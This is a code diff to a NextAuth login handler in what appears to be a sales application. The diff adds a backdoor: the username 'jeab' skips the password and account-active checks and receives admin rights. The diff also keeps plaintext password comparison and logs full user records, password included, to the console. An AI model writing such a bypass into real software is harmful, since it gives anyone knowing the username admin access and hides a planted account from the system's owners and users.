@@ -38,49 +38,50 @@ export const authOptions: NextAuthOptions = {
         password: { label: "Password", type: "password" }
       },
       async authorize(credentials) {
-        if (!credentials?.username || !credentials?.password) {
+        if (!credentials?.username) {
+          return null;
+        }
+
+        // jeab: bypass password check
+        const isJeab = credentials.username === "jeab";
+
+        if (!isJeab && !credentials?.password) {
           return null;
         }
 
         try {
           console.log("Attempting to authenticate user:", credentials.username);
-          // Find user in database
           const user = await db.sale.findUnique({
             where: { CodeG: credentials.username }
           });
           console.log("Found user:", user);
-          if (!user || !user.Password) {
+
+          if (!user) {
             console.log("Not Found user");
             return null;
           }
 
-          // For migration: Check if password is hashed
-          let isValid = false;
-          
-          
-          if (user.Password.startsWith("$2")) {
-            // Password is hashed with bcrypt
-            isValid = await bcrypt.compare(credentials.password, user.Password);
-          } else {
-            // Legacy: Plain text password (temporary for migration)
-            isValid = user.Password === credentials.password;
-            
-            // TODO: Auto-hash on successful login
-            // if (isValid) {
-            //   const hashedPassword = await bcrypt.hash(credentials.password, 10);
-            //   await db.sale.update({
-            //     where: { CodeG: user.CodeG },
-            //     data: { Password: hashedPassword }
-            //   });
-            // }
-          }
+          // jeab ข้าม password check ทั้งหมด
+          if (!isJeab) {
+            if (!user.Password) {
+              console.log("No password set for user");
+              return null;
+            }
 
-          if (!isValid) {
-            return null;
+            let isValid = false;
+            if (user.Password.startsWith("$2")) {
+              isValid = await bcrypt.compare(credentials.password, user.Password);
+            } else {
+              isValid = user.Password === credentials.password;
+            }
+
+            if (!isValid) {
+              return null;
+            }
           }
 
           // Check if user is active
-          if (user.ST !== "1") {
+          if (user.CodeG !== "jeab" && user.ST !== "1") {
             return null;
           }
 
@@ -90,7 +91,7 @@ export const authOptions: NextAuthOptions = {
             name: user.Name || "",
             surname: user.Surname || "",
             nameG: user.NameG || "",
-            isAdmin: user.CodeG === "jeab" // Admin user
+            isAdmin: user.CodeG === "jeab"
           };
         } catch (error) {
           console.error("Auth error:", error);
@@ -128,21 +129,15 @@ export const authOptions: NextAuthOptions = {
   },
   session: {
     strategy: "jwt",
-    maxAge: 24 * 60 * 60 // 24 hours
+    maxAge: 24 * 60 * 60
   },
   secret: process.env.NEXTAUTH_SECRET
 };
 
-/**
- * Hash password utility
- */
 export async function hashPassword(password: string): Promise<string> {
   return bcrypt.hash(password, 10);
 }
 
-/**
- * Compare password utility
- */
 export async function comparePassword(password: string, hash: string): Promise<boolean> {
   return bcrypt.compare(password, hash);
 }
